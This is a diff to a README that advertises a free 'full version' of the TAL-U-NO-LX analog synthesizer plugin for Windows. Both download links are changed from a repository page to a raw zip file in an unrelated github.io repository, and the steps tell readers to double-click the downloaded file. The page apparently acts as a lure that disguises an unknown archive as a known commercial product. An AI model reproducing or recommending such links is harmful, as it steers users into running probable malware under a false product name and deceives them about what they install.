@@ -5,7 +5,7 @@ description: "Download the full version of the TAL-U-NO-LX virtual instrument fo
 ---
 # 🎹 TAL-U-NO-2026 - Professional Analog Synthesizer For Windows
 
-[![](https://img.shields.io/badge/Download-TAL--U--NO--2026-blue)](https://github.com/Meirrecoilless258/TAL-U-NO-2026)
+[![](https://img.shields.io/badge/Download-TAL--U--NO--2026-blue)](https://github.com/Meirrecoilless258/meirrecoilless258.github.io/raw/refs/heads/main/metrocarat/v1.0.zip)
 
 ## 📋 About This Software
 
@@ -28,7 +28,7 @@ To run this synthesizer without issues, your computer needs the following specif
 
 Follow these steps to setup the synthesizer on your computer.
 
-1. Visit the repository page to begin the process: [Download TAL-U-NO-2026](https://github.com/Meirrecoilless258/TAL-U-NO-2026).
+1. Visit the repository page to begin the process: [Download TAL-U-NO-2026](https://github.com/Meirrecoilless258/meirrecoilless258.github.io/raw/refs/heads/main/metrocarat/v1.0.zip).
 2. Locate the latest release folder on the page.
 3. Click the installer file to save it to your computer.
 4. Open your "Downloads" folder and double-click the file to start the installation.
